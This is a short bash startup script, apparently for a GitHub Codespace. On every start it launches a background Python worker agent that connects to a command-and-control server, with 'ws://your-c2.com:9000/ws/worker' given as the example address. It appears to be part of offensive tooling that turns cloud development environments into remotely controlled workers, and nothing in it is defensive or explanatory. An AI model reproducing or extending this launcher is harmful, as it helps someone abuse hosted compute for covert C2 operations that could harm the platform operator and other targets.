#!/bin/bash
# runs every time Codespace starts

export PATH=$PATH:/usr/local/go/bin
cd "$(dirname "$0")/.."

if [ -z "$C2_URL" ]; then
    echo "[!] C2_URL not set — set it in Codespaces secrets"
    echo "[!] example: ws://your-c2.com:9000/ws/worker"
    exit 1
fi

echo "[*] starting worker → $C2_URL"
nohup python worker/agent.py > worker.log 2>&1 &
echo "[+] worker running in background (pid $!)"
echo "[*] logs: tail -f worker.log"